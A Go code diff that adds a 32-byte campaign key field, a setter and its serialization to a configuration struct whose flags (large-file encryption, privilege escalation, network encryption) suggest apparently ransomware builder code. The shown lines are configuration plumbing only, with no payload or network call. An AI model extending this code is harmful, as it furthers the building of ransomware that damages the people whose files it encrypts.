@@ -42,6 +42,7 @@ func decompress(input []byte) ([]byte, error) {
 
 type Configuration struct {
 	version                 []int
+	campaignKey             [32]byte
 	largeFileEncryptFlag    bool
 	privilegeEscalationFlag bool
 	networkEncryptFlag      bool
@@ -69,6 +70,10 @@ func createConfiguration() (*Configuration, error) {
 
 func (config *Configuration) setVersion(version []int) {
 	config.version = version
+}
+
+func (config *Configuration) setCampaignKey(campaignKey [32]byte) {
+	config.campaignKey = campaignKey
 }
 
 func (config *Configuration) setFlags(flags []bool) {
@@ -203,6 +208,9 @@ func (config *Configuration) toBytes() []byte {
 		result = append(result, byte(val))
 	}
 	result = append(result, separator...)
+
+	// add campaignKey
+	result = append(result, config.campaignKey[:]...)
 
 	// add flags
 	flags := []bool{config.largeFileEncryptFlag, config.privilegeEscalationFlag, config.networkEncryptFlag,
